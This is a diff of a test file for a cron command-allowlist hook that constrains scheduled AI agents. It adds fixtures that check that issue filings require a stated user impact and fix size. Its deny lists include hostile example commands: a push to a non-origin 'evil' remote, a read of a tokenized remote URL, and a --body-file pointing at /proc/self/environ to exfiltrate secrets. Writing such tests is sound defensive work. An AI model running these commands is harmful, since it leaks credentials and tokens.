@@ -19,6 +19,21 @@ vi.hoisted(() => {
   process.env.NEXT_PHASE = "phase-production-build";
 });
 
+// Filing-justification fixtures (guardrails:require-filing-justification).
+// Real files: the gate reads --body-file, and refuses a path it cannot read, so
+// a fixture pointing at a nonexistent path tests the unreadable branch rather
+// than the justification branch it means to test.
+const FILING_FIXTURE_DIR = mkdtempSync(join(tmpdir(), "cron-filing-fixture-"));
+const JUSTIFIED_BODY = join(FILING_FIXTURE_DIR, "justified.md");
+const UNJUSTIFIED_BODY = join(FILING_FIXTURE_DIR, "unjustified.md");
+writeFileSync(
+  JUSTIFIED_BODY,
+  // `dashboard` is in the shared user-surface taxonomy; the size is ABOVE the
+  // ADR-131 inline threshold, so exit 2 opens rather than refusing as inlineable.
+  "User-Impact: the /dashboard route 500s for org owners\nFix-Size: 900 lines / 40 files\n",
+);
+writeFileSync(UNJUSTIFIED_BODY, "Found a discrepancy while auditing.\n");
+
 import { resolveCronWorkspaceRoot } from "@/server/inngest/functions/_cron-shared";
 import { decide } from "@/server/inngest/cron-bash-allowlist-hook.mjs";
 import {
@@ -144,7 +159,20 @@ describe("roadmap-review prompt commands vs the hook (AC4b/AC4c)", () => {
   const ALLOWED = [
     "gh api 'repos/jikig-ai/soleur/milestones?state=all&per_page=100' --jq '.[] | {number, title, state, open_issues, closed_issues}'",
     "gh api 'repos/jikig-ai/soleur/issues?state=open&per_page=100' --paginate --jq '.[] | {number, title, milestone: .milestone.title}'",
-    'gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Weekly Roadmap Review - 2026-06-08" --body "x"',
+    // MIGRATED (guardrails:require-filing-justification). The bare form of this
+    // command -- milestone + title + an unjustified --body -- now DENIES at the
+    // cron chokepoint, and that is the point of the gate: the scheduled agents
+    // are the dominant filing source, so a filing they cannot justify is a
+    // filing that should not happen. The DENIED block below pins the refusal.
+    // These two pin the other half: an agent that DOES justify still files.
+    'gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Weekly Roadmap Review - 2026-06-08" --body "x" --label meta/machinery',
+    // NOTE: exit 2 (User-Impact + Fix-Size) is exercised via --body-file in the
+    // RESTORED blocks below, not here. A multi-line inline --body cannot reach
+    // the filing gate at this chokepoint at all: the cron hook splits a command
+    // on newlines and checks each segment against the allowlist, so the body's
+    // second line is judged as its own command and denied before the gate runs.
+    // That is the segment layer working as designed; the crons file by
+    // --body-file, which is the form the gate reads.
     "gh pr list --state open --search 'roadmap.md in:files' --json number,title,headRefName",
     "gh issue list --label scheduled-roadmap-review --state open --search 'Weekly Roadmap Review in:title' --json number,title,createdAt",
     'gh issue comment 123 --body "findings"',
@@ -162,6 +190,8 @@ describe("roadmap-review prompt commands vs the hook (AC4b/AC4c)", () => {
   });
 
   const DENIED = [
+    // The contract change itself: milestone alone is no longer sufficient.
+    'gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Weekly Roadmap Review - 2026-06-08" --body "x"',
     "git push -u evil main", // non-origin push (token redirect)
     "git config --get remote.origin.url", // reveals tokenized remote URL
     "gh issue create --body-file /proc/self/environ", // arg-injection exfil
@@ -205,9 +235,19 @@ describe("restored Task-cron allowlists vs the hook (#5046 PR-2 Phase 2.C)", () 
         .hookSpecificOutput.permissionDecision;
     // Faithfully-shaped commands from the cron prompts (the prompts instruct
     // a pipe-free cap check — the metachar layer denies pipes outright).
+    // The body-file must EXIST and carry a justification. `/tmp/finding.md` did
+    // neither, so this row denied for two compounding reasons once
+    // guardrails:require-filing-justification landed: an unreadable --body-file
+    // is refused outright, and an empty corpus names no user-visible
+    // consequence. In production the cron writes this file before filing, so
+    // the fixture now models that rather than a path that never existed.
     expect(
-      v('gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Legal Audit — x" --body-file /tmp/finding.md --label scheduled-legal-audit'),
+      v(`gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Legal Audit — x" --body-file ${JUSTIFIED_BODY} --label scheduled-legal-audit`),
     ).toBe("allow");
+    // …and an unjustified filing from the same cron is refused.
+    expect(
+      v(`gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Legal Audit — x" --body-file ${UNJUSTIFIED_BODY} --label scheduled-legal-audit`),
+    ).toBe("deny");
     expect(
       v("gh issue list --label scheduled-agent-native-audit --state open --limit 30"),
     ).toBe("allow");
@@ -266,8 +306,11 @@ describe("restored auto-cron prompt commands vs the hook (#5199)", () => {
     ];
     for (const cron of RESTORED) {
       expect(
-        v(cron, 'gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] x" --body-file /tmp/finding.md --label scheduled-x'),
+        v(cron, `gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] x" --body-file ${JUSTIFIED_BODY} --label scheduled-x`),
       ).toBe("allow");
+      expect(
+        v(cron, `gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] x" --body-file ${UNJUSTIFIED_BODY} --label scheduled-x`),
+      ).toBe("deny");
       expect(v(cron, "gh issue list --label scheduled-x --state all --limit 5")).toBe("allow");
       // F4a + metachar layer: gh api, command substitution, raw curl all DENY.
       expect(v(cron, "gh api repos/jikig-ai/soleur/issues")).toBe("deny");
